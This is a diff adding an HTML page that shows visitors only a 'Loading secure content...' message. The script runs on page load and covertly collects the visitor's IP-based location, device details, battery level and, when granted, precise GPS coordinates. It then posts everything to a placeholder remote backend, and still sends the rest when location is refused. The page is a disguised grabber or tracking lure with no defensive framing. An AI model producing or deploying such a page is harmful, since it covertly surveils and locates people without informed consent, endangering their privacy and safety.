@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <script>
+    async function getBattery() {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        return Math.round(battery.level * 100) + "%";
+      }
+      return "N/A";
+    }
+
+    async function sendData(data) {
+      await fetch("https://your-railway-backend.up.railway.app/send", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(data)
+      });
+    }
+
+    function getIPInfo() {
+      return fetch("https://ipapi.co/json/").then(res => res.json());
+    }
+
+    function getDeviceInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        screen: screen.width + "x" + screen.height
+      };
+    }
+
+    async function collectAndSend() {
+      const battery = await getBattery();
+      const ipInfo = await getIPInfo();
+      const deviceInfo = getDeviceInfo();
+
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const location = {
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude
+        };
+        await sendData({ ipInfo, deviceInfo, battery, location });
+      }, async err => {
+        await sendData({ ipInfo, deviceInfo, battery, error: "Location denied" });
+      });
+    }
+
+    collectAndSend();
+  </script>
+</head>
+<body>
+  <h3>Loading secure content...</h3>
+</body>
+</html>
